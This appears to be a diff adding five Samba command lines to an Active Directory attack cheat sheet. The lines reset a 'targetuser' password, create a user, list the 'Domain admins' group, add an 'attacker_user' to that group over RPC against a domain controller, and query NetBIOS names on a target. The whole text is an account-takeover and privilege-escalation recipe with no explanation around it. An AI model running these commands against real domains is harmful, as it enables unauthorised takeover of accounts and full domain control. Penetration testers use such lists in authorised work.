@@ -1,0 +1,5 @@
+net rpc password 'targetuser' 'somenewpassword123' -U "$DOMAIN"/"$USER"%"$PASSWORD" -S "$DC_HOST"
+net rpc user add 'targetuser' "$PASSWORD" -U "$DOMAIN"/"$USER"%"$PASSWORD" -S "$DC_HOST"
+net rpc group members 'Domain admins' -U "$DOMAIN"/"$USER"%"$PASSWORD" -S "$DC_HOST"
+net rpc group addmem 'Domain admins' 'attacker_user' -U "$DOMAIN"/"$USER"%"$PASSWORD" -S "$DC_HOST"
+nmblookup -A "$TARGET"
